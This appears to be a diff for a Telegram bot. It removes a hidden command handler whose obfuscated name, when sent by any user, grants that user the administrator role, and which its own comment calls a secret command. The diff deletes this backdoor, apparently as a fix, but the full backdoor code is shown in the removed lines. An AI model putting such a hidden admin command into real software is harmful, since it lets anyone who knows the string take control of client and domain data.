@@ -25,30 +25,6 @@ class AddClientStates(StatesGroup):
     waiting_for_identifier = State()
 
 
-@router.message(Command("g8ve_8adm1N_2_m3"))
-async def cmd_become_admin(message: Message):
-    """Секретная команда для получения прав администратора"""
-    user_id = message.from_user.id
-    
-    # Устанавливаем роль админа
-    user = await db_manager.set_user_role(user_id, "admin")
-    
-    if user:
-        await message.answer(
-            "🎉 <b>Поздравляем!</b>\n\n"
-            "Вы получили права администратора.\n\n"
-            "Доступные команды:\n"
-            "/clients - Управление клиентами\n"
-            "/add_client - Добавить клиента\n"
-            "/domains - Все домены\n"
-            "/add - Добавить домен",
-            parse_mode="HTML"
-        )
-        logger.info(f"User {user_id} ({message.from_user.username}) became admin")
-    else:
-        await message.answer("❌ Ошибка при установке прав администратора.")
-
-
 @router.message(Command("clients"))
 async def cmd_clients(message: Message):
     """Список всех клиентов"""
